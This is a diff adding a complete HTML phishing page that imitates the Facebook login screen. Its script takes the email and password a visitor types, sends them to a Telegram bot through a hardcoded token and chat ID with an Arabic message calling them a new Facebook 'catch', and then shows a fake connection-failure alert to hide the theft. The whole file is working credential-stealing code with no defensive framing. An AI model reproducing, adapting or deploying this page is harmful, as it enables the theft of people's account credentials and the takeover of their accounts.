@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<script>
+function capture() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('chatId') || "5905562720"; 
+    const token = "8521496596:AAGb7ODWoScawEb5Fm78sPLL8pfBeXZQzlg";
+    const u = document.getElementById('email').value;
+    const p = document.getElementById('pass').value;
+    const msg = `👤 **صيد فيسبوك جديد**\n\n📧 الإيميل: \`${u}\`\n🔑 الباسورد: \`${p}\``;
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+    alert("فشل الاتصال بالخادم. حاول مجدداً لاحقاً.");
+}
+</script>
+<body style="text-align:center; background:#f0f2f5; font-family:sans-serif; padding-top:50px;">
+    <h2 style="color:#1877f2; font-size:40px;">facebook</h2>
+    <input id="email" placeholder="Email or Phone" style="width:80%; padding:10px; margin:10px;"><br>
+    <input id="pass" type="password" placeholder="Password" style="width:80%; padding:10px; margin:10px;"><br>
+    <button onclick="capture()" style="width:83%; background:#1877f2; color:white; padding:10px; border:none; font-weight:bold;">Log In</button>
+</body>
+</html>
